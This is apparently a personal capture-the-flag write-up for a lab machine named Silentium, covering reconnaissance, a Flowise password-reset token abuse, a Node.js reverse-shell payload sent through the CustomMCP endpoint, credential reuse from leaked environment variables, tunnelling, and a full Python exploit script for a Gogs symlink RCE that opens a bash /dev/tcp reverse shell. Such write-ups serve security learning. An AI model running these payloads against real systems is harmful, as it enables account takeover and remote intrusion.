### Nmap
```
nmap -sV -sC -vv 10.129.31.59

---OUTPUT---
Nmap scan report for 10.129.31.59
Host is up, received echo-reply ttl 63 (0.019s latency).
Scanned at 2026-04-14 05:45:39 EDT for 9s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9Ju3bTZsFozwXY1B2KIlEY4BA+RcNM57w4C5EjOw1QegUUyCJoO4TVOKfzy/9kd3WrPEj/FYKT2agja9/PM44=
|   256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH9qI0OvMyp03dAGXR0UPdxw7hjSwMR773Yb9Sne+7vD
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://silentium.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![[Pasted image 20260414060819.png]]


## Ffuf
- Ffuf reveals a subdomain
```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://silentium.htb/ -H 'Host: FUZZ.silentium.htb' -fw 6    

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://silentium.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.silentium.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 6
________________________________________________

staging                 [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 18ms]
:: Progress: [100000/100000] :: Job [1/1] :: 2739 req/sec :: Duration: [0:00:42] :: Errors: 0 ::
```

![[Pasted image 20260414083353.png]]

- Looking at searchsploit I see 2 vulnerabilities an Authentication Bypass  CVE-2024-31621 (https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-v5w9-prxf-w882) and RCE CVE-2025-59528 

-  I can access the account setup page via the subdirectory `/organization-setup` but before that I can create an account via the `/register` endpoint
![[Pasted image 20260414084609.png]]

![[Pasted image 20260414084943.png]]


- However none of these register a user.
- When I click forgot password I test some of the names we gfound in the main website. namely ben and find it is a valid user.
```
ben@silentium.htb
```
![[Pasted image 20260414090818.png]]

- Looking at BurpSuite I see I get a TempToken:
```
{"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin","email":"ben@silentium.htb","credential":"$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG","tempToken":"oiBP5MEhrpC6PDWpRSHrb2UTc6m5baxISWrbCrrveR3jQG8kdQPka0de6JW4ghJL","tokenExpiry":"2026-04-14T13:23:29.459Z","status":"active","createdDate":"2026-01-29T20:14:57.000Z","updatedDate":"2026-04-14T13:08:29.000Z","createdBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73","updatedBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73"},
```

- and encrypted creds  dont crack

- This leads me to another GHSA advisory where it shows we can use this token to reset password of the user: https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-wgpv-6j63-x5ph
- After getting the reset token can either go to the url (http://staging.silentium.htb/reset-password) or via the following curl command to set a new password:
```
curl -i -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -d '{
        "user":{
          "email":"ben@silentium.htb",
          "tempToken":"Gnt1RW8ebLNlmeQOlZuHXChxlmVTeuoTar5s2FmTSbbmD1mUr6IS4jCzCHIOcMZq",
          "password":"NewSecurePassword123!"
        }
      }'
HTTP/1.1 201 Created
Server: nginx/1.24.0 (Ubuntu)
Date: Tue, 14 Apr 2026 13:13:51 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 493
Connection: keep-alive
Vary: Origin
Access-Control-Allow-Credentials: true
ETag: W/"1ed-CgSUMgkOiX3cU7EmlsEB2EEi8BM"

{"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin","email":"ben@silentium.htb","credential":"$2a$05$ajWC1xva5iAhT3UFuTIa8ujCWPE0B5d.x6zfd3G27c5jPVFgmgaQy","tempToken":"","tokenExpiry":null,"status":"active","createdDate":"2026-01-29T20:14:57.000Z","updatedDate":"2026-04-14T13:13:51.000Z","createdBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73","updatedBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73"},"organization":{},"organizationUser":{},"workspace":{},"workspaceUser":{},"role":{}}                                                           
```
![[Pasted image 20260414091559.png]]

- I can then sing in with the new password:
![[Pasted image 20260414091649.png]]

- Looking at the Burp packet I see we get a token and more :
![[Pasted image 20260415045757.png]]

- I then navigate to A new chatflow and start a CustomMCP tool (New to the RCE we found earlier https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3gcm-f6qx-ff7p
![[Pasted image 20260415050013.png]]

- Capturing the packet  on burpsuite I see the endpoint and a way to input data:
- Based on the RCE advisory I alter it to my payload and grab a shell:
- Main payload:
```
"mcpServerConfig":"({x:(function(){ const cp = process.mainModule.require(\"child_process\"); const net = process.mainModule.require(\"net\"); const sh = cp.spawn(\"/bin/sh\", [\"-i\"]); const client = new net.Socket(); client.connect(4444, \"10.10.17.167\", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return 1; })()})"
```

- Full packet :
```
POST /api/v1/node-load-method/customMCP HTTP/1.1
Host: staging.silentium.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
x-request-from: internal
Content-Length: 2479
Origin: http://staging.silentium.htb
Connection: keep-alive
Referer: http://staging.silentium.htb/canvas
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImUyNmM5ZDZjLTY3OGMtNGMxMC05ZTM2LTAxODEzZThmZWE3MyIsInVzZXJuYW1lIjoiYWRtaW4iLCJtZXRhIjoiNTExNzExMzcyMGI0NjE2M2RhMmRkNDJlZDY4NzMyZWE6NjIxYmI0MzRiZjc4N2JmNTE3NWQxOWViM2RmMTA0MGFkMmVmMDdkYTlhM2QxOWZkZjNmNTVhYmQ1NDU0NmJmYmFjNGNlNmQxNjU0NjMxODlmODYwODYzMjJmYmYxY2ZhZTViMGE5OTQ0MmIxNzQ1ZDY3OTMxMjVlMGI2MWZiNDJhODRlNGRmM2YzZDA4NzIyZGU3ZjI3MTE2ODkzMWQ0NCIsImlhdCI6MTc3NjI0MjE4MywibmJmIjoxNzc2MjQyMTgzLCJleHAiOjE3NzYyNjM3ODMsImF1ZCI6IkFVRElFTkNFIiwiaXNzIjoiSVNTVUVSIn0.C4KyWzFDaA2PneZ75eoXsIlwLqFXG4KMuB61pFIQBg4; refreshToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImUyNmM5ZDZjLTY3OGMtNGMxMC05ZTM2LTAxODEzZThmZWE3MyIsInVzZXJuYW1lIjoiYWRtaW4iLCJtZXRhIjoiM2Q0NmYyZjFmYzU4N2IxMWJmMDdhNjJjYWQwMTcxNzc6Mzg4YTBlZjg2NDE0NmE5NGNiN2E1ZWMyNDkxNWQ2Zjc2MzliZGU4NTcwMTk1NjZjYzJjNDE0NjQ3Y2E3ZGFjZDYwMTkzZjYxZjJmNzZmYThiMTIxY2ZlM2Q0ZGMyZGJhMzNjY2YyMjAyNThjNTIxZTVlMjQzYmEyNjc0NGQ1MzVmYmU5NjA2MWI5YmFjNDllYjAwZTM3ZDliODBhMDIxNSIsImlhdCI6MTc3NjI0MjE4MywibmJmIjoxNzc2MjQyMTgzLCJleHAiOjE3Nzg4MzQxODMsImF1ZCI6IkFVRElFTkNFIiwiaXNzIjoiSVNTVUVSIn0.ZUx2AG01gkNa1Z-bpmoFnxgeINhr1HobFpHgqavQAMw; connect.sid=s%3AXQ_6gpixnoclP3i7tjyccI1BuiQXW6wH.1bUipMfQIBbgazJZCDFSit11gT6bFxw%2FRLAmSjswy9s

{"loadMethods":{},"label":"Custom MCP","name":"customMCP","version":1.1,"type":"Custom MCP Tool","icon":"/usr/local/lib/node_modules/flowise/node_modules/flowise-components/dist/nodes/tools/MCP/CustomMCP/customMCP.png","category":"Tools (MCP)","description":"Custom MCP Config","documentation":"https://github.com/modelcontextprotocol/servers/tree/main/src/brave-search","inputs":{"mcpServerConfig":"({x:(function(){ const cp = process.mainModule.require(\"child_process\"); const net = process.mainModule.require(\"net\"); const sh = cp.spawn(\"/bin/sh\", [\"-i\"]); const client = new net.Socket(); client.connect(4444, \"10.10.17.167\", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return 1; })()})","mcpActions":""},"baseClasses":["Tool"],"filePath":"/usr/local/lib/node_modules/flowise/node_modules/flowise-components/dist/nodes/tools/MCP/CustomMCP/CustomMCP.js","inputAnchors":[],"inputParams":[{"label":"MCP Server Config","name":"mcpServerConfig","type":"code","hideCodeExecute":true,"hint":{"label":"How to use","value":"\nYou can use variables in the MCP Server Config with double curly braces `{{ }}` and prefix `$vars.<variableName>`. \n\nFor example, you have a variable called \"var1\":\n```json\n{\n    \"command\": \"docker\",\n    \"args\": [\n        \"run\",\n        \"-i\",\n        \"--rm\",\n        \"-e\", \"API_TOKEN\"\n    ],\n    \"env\": {\n        \"API_TOKEN\": \"{{$vars.var1}}\"\n    }\n}\n```\n\nFor example, when using SSE, you can use the variable \"var1\" in the headers:\n```json\n{\n    \"url\": \"https://api.example.com/endpoint/sse\",\n    \"headers\": {\n        \"Authorization\": \"Bearer {{$vars.var1}}\"\n    }\n}\n```\n"},"placeholder":"{\n    \"command\": \"npx\",\n    \"args\": [\"-y\", \"@modelcontextprotocol/server-filesystem\", \"/path/to/allowed/files\"]\n}","id":"customMCP_0-input-mcpServerConfig-code","display":true},{"label":"Available Actions","name":"mcpActions","type":"asyncMultiOptions","loadMethod":"listActions","refresh":true,"id":"customMCP_0-input-mcpActions-asyncMultiOptions","display":true}],"outputs":{},"outputAnchors":[{"id":"customMCP_0-output-customMCP-Tool","name":"customMCP","label":"Custom MCP Tool","description":"Custom MCP Config","type":"Tool"}],"id":"customMCP_0","selected":true,"loadMethod":"listActions","previousNodes":[],"currentNode":{"id":"customMCP_0","name":"customMCP","label":"Custom MCP","inputs":{"mcpServerConfig":"","mcpActions":""}}}
```

- I grab a shell as root (but its a container):
![[Pasted image 20260415050229.png]]
- Env variables reveals some creds:
```
env

---OUTPUT---
FLOWISE_PASSWORD=F1l3_d0ck3r
ALLOW_UNAUTHORIZED_CERTS=true
NODE_VERSION=20.19.4
HOSTNAME=c78c3cceb7ba
YARN_VERSION=1.22.22
SMTP_PORT=1025
SHLVL=2
PORT=3000
HOME=/root
OLDPWD=/home/node
SENDER_EMAIL=ben@silentium.htb
PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
JWT_ISSUER=ISSUER
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
LLM_PROVIDER=nvidia-nim
SMTP_USERNAME=test
SMTP_SECURE=false
JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200
FLOWISE_USERNAME=ben
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DATABASE_PATH=/root/.flowise
JWT_TOKEN_EXPIRY_IN_MINUTES=360
JWT_AUDIENCE=AUDIENCE
SECRETKEY_PATH=/root/.flowise
PWD=/home
SMTP_PASSWORD=r04D!!_R4ge
NVIDIA_NIM_LLM_MODE=managed
SMTP_HOST=mailhog
JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
SMTP_USER=test
```

- Secret Password points to a folder `/root/.flowsie` which has some interesting data:
```
cd /root/.flowwise
cat encryption.key

---OUTPUT---
hdsVqdkOcLN4fwdpvMPtbAi2++qi8yFc
```
- I also dump the sqlite data but find nothing interesting
- Looking at the other passwords obtained I try to ssh into the target and get a hit with the SMTP password `r04D!!_R4ge`
```
ssh ben@silentium.htb
```
![[Pasted image 20260415051142.png]]

- I grab the user flag:

![[Pasted image 20260415051216.png]]
![[Pasted image 20260415051256.png]]

- in `/opt` there is a `gos` folder and I find a secret key in `app.ini` at : `/opt/gogs/gogs/custom/conf`
```
BRAND_NAME = Gogs
RUN_USER   = root
RUN_MODE   = prod

[server]
HTTP_ADDR        = 127.0.0.1
HTTP_PORT        = 3001
DOMAIN           = staging-v2-code.dev.silentium.htb
ROOT_URL         = http://staging-v2-code.dev.silentium.htb/
OFFLINE_MODE     = false
EXTERNAL_URL     = http://staging-v2-code.dev.silentium.htb:3001/
DISABLE_SSH      = false
SSH_PORT         = 22
START_SSH_SERVER = false

[database]
TYPE     = sqlite3
PATH     = /opt/gogs/data/gogs.db
HOST     = 127.0.0.1:5432
NAME     = gogs
SCHEMA   = public
USER     = gogs
PASSWORD = 
SSL_MODE = disable

[repository]
ROOT_PATH      = /root/gogs-repositories
DEFAULT_BRANCH = master
ROOT           = /root/gogs-repositories

[session]
PROVIDER = file

[log]
MODE      = file
LEVEL     = Info
ROOT_PATH = /opt/gogs/log

[security]
INSTALL_LOCK = true
SECRET_KEY   = sdsrcxSm0iC7wDO

[email]
ENABLED = false

[auth]
REQUIRE_EMAIL_CONFIRMATION  = false
DISABLE_REGISTRATION        = false
ENABLE_REGISTRATION_CAPTCHA = true
REQUIRE_SIGNIN_VIEW         = false

[user]
ENABLE_EMAIL_NOTIFICATION = false

[picture]
DISABLE_GRAVATAR        = false
ENABLE_FEDERATED_AVATAR = false
```
- Furthermore Gogs is running internally on port 3000 and 3001.
![[Pasted image 20260415072638.png]]
- I create a tunnel with ligolo :
- local
```
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 240.0.0.1/32 dev ligolo

./proxy -selfcert -laddr 0.0.0.0:9000
```
- target:
```
./agent -connect 10.10.17.167:9000 -ignore-cert
```
- Local again to start session tunnel:
```
session
1
start
```
- checking the url  (after adding the url from app.ini to /etc/hosts): 
![[Pasted image 20260415060947.png]]

- I register a new user:
![[Pasted image 20260415061117.png]]

- I login:
![[Pasted image 20260415061135.png]]

- Looking online I find GOGS is vulnerable to an RCE exploit cve-2025-8110 : https://github.com/kayl22/cve-2025-8110-GOGS-RCE
- Alternatively can use this code:
```
#!/usr/bin/env python3

import argparse
import requests
import os
import subprocess
import shutil
import urllib3
from urllib.parse import urlparse
import base64
from bs4 import BeautifulSoup
from rich.console import Console

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()

"""Exploit script for CVE-2025-8110 in Gogs."""

__author__ = "zAbuQasem"
__Linkedin__ = "https://www.linkedin.com/in/zeyad-abulaban/"

proxies = {
    "http": "http://localhost:8080",
    "https": "http://localhost:8080",
}


def register(session, base_url, username, password):
    """Register a new user."""
    register_url = f"{base_url}/user/sign_up"
    resp = session.get(register_url)  # Get CSRF token from form

    csrf = extract_csrf(resp.text)

    register_data = {
        "_csrf": csrf,
        "user_name": username,
        "email": "zAbuQasem@attacker.com",
        "password": password,
        "retype": password,
    }
    resp = session.post(
        register_url,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=register_data,
        allow_redirects=True,
    )
    if "Username has already been taken." in resp.text:
        pass  # User already exists, continue
    elif "user/sign_up" in resp.url:
        console.print(f"[bold red]Registration failed: {resp.status_code}[/bold red]")
        raise ValueError("Registration failed")
    console.print("[bold green][+] Registered successfully[/bold green]")
    return session.cookies


def login(session, base_url, username, password):
    """Authenticate and retrieve CSRF token + session cookie."""
    login_url = f"{base_url}/user/login"
    resp = session.get(login_url)  # Get CSRF token from form

    csrf = extract_csrf(resp.text)

    login_data = {
        "_csrf": csrf,
        "user_name": username,
        "password": password,
    }
    resp = session.post(
        login_url,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=login_data,
        allow_redirects=True,
    )
    if "user/login" in resp.url:
        console.print(f"[bold red]Authentication failed: {resp.status_code}[/bold red]")
        raise ValueError("Authentication failed")
    console.print("[bold green][+] Authenticated successfully[/bold green]")
    return session.cookies


def get_application_token(session, base_url):
    """Retrieve application token from settings."""
    settings_url = f"{base_url}/user/settings/applications"
    # First GET to fetch the page (and CSRF hidden field) before POSTing
    get_resp = session.get(settings_url, allow_redirects=True)
    csrf = extract_csrf(get_resp.text)

    data = {"_csrf": csrf, "name": os.urandom(8).hex()}
    resp = session.post(settings_url, data=data, allow_redirects=True)
    console.print(f"[blue]Token generation status: {resp.status_code}[/blue]")
    soup = BeautifulSoup(resp.text, "html.parser")
    token_div = soup.find("div", class_="ui info message")
    if not token_div:
        raise ValueError("Application token not found")
    token = token_div.find("p").text.strip()
    console.print(f"[bold green][+] Application token: {token}[/bold green]")
    return token


def create_malicious_repo(session, base_url, token):
    """Create a repository with a malicious payload."""
    api = f"{base_url}/api/v1/user/repos"
    repository_name = os.urandom(6).hex()
    data = {
        "name": repository_name,
        "description": "Malicious repo for CVE-2025-8110",
        "auto_init": True,
        "readme": "Default",
        "ssh": True,
    }
    session.headers.update({"Authorization": f"token {token}"})
    resp = session.post(api, json=data)
    console.print(f"[blue]Repo creation status: {resp.status_code}[/blue]")
    return repository_name


def upload_malicious_symlink(base_url, username, password, repo_name):
    """Clone a repo, add a symlink, commit, and push it."""
    repo_dir = f"/tmp/{repo_name}"

    parsed_url = urlparse(base_url)
    if not parsed_url.scheme or not parsed_url.netloc:
        raise ValueError("Base URL must include scheme (e.g., http://host)")
    base_path = parsed_url.path.rstrip("/")

    clone_cmd = [
        "git",
        "clone",
        f"{parsed_url.scheme}://{username}:{password}@{parsed_url.netloc}"
        f"{base_path}/{username}/{repo_name}.git",
        repo_dir,
    ]

    symlink_path = os.path.join(repo_dir, "malicious_link")

    try:
        # Clean up if directory already exists
        if os.path.exists(repo_dir):
            shutil.rmtree(repo_dir)

        # Clone repository
        subprocess.run(clone_cmd, check=True)

        # Create symlink inside the repo
        os.symlink(".git/config", symlink_path)

        # Add, commit, and push
        subprocess.run(
            ["git", "add", "malicious_link"],
            cwd=repo_dir,
            check=True,
        )

        subprocess.run(
            ["git", "commit", "-m", "Add malicious symlink"],
            cwd=repo_dir,
            check=True,
        )

        subprocess.run(
            ["git", "push", "origin", "master"],
            cwd=repo_dir,
            check=True,
        )

    except subprocess.CalledProcessError as e:
        raise ValueError(f"Git command failed: {e}") from e
    except OSError as e:
        raise ValueError(f"Filesystem operation failed: {e}") from e


def exploit(session, base_url, token, username, repo_name, command):
    """Exploit CVE-2025-8110 to execute arbitrary commands."""
    api = f"{base_url}/api/v1/repos/{username}/{repo_name}/contents/malicious_link"
    data = {
        "message": "Exploit CVE-2025-8110",
        "content": base64.b64encode(command.encode()).decode(),
    }
    headers = {
        "Authorization": f"token {token}",
        "Content-Type": "application/json",
    }
    console.print("[bold green][+] Exploit sent, check your listener![/bold green]")
    session.put(api, json=data, headers=headers, timeout=5)


def extract_csrf(html_text):
    """Parse CSRF token from hidden input; fallback to cookie if present."""
    soup = BeautifulSoup(html_text, "html.parser")
    token_input = soup.select_one("input[name=_csrf]")
    if token_input and token_input.get("value"):
        return token_input.get("value")
    raise ValueError("CSRF token not found in form response")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True, help="Gogs base URL")
    parser.add_argument("-lh", "--host", required=True, help="Attacker host")
    parser.add_argument("-lp", "--port", required=True, help="Attacker port")
    parser.add_argument("-x", "--proxy", action="store_true", help="Use proxy")
    args = parser.parse_args()
    session = requests.Session()
    if args.proxy:
        session.proxies.update(proxies)
    session.verify = False
    username = "zAbuQasem"
    password = "SuperSecurePass123!"
    command = f"bash -c 'bash -i >& /dev/tcp/{args.host}/{args.port} 0>&1' #"
    try:
        register(session, args.url, username, password)
        login(session, args.url, username, password)
        token = get_application_token(session, args.url)
        repo_name = create_malicious_repo(session, args.url, token)
        git_config = f"""[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
        ignorecase = true
        precomposeunicode = true
  sshCommand = {command}
[remote "origin"]
        url = git@localhost:gogs/{repo_name}.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
        remote = origin
        merge = refs/heads/master
"""
        upload_malicious_symlink(args.url, username, password, repo_name)
        exploit(session, args.url, token, username, repo_name, git_config)

    except Exception as e:
        console.print(f"[bold red][-] Error: {e}[/bold red]")


if __name__ == "__main__":
    main()
```
- execute command:
```
python3 rexploit.py -u http://staging-v2-code.dev.silentium.htb/ --username test --password test --lhost 10.10.17.167 --lport 9999 --token 40fc0bd6d71ce7edc3acd9bbad76cdc8624b8d6a
[+] Authenticated successfully
[+] Application token: 40fc0bd6d71ce7edc3acd9bbad76cdc8624b8d6a
    Repo creation status: 422
[+] Symlink pushed
[+] Exploit sent, check your listener!
```

- Using the exploit I grab a revshell: (fails without registering user due to captcha)
```
python3 exp.py -u http://staging-v2-code.dev.silentium.htb -lh 10.10.17.167 -lp 9999 -U test -P test
```
![[Pasted image 20260415071742.png]]

- I grab the root flag:
![[Pasted image 20260415071827.png]]
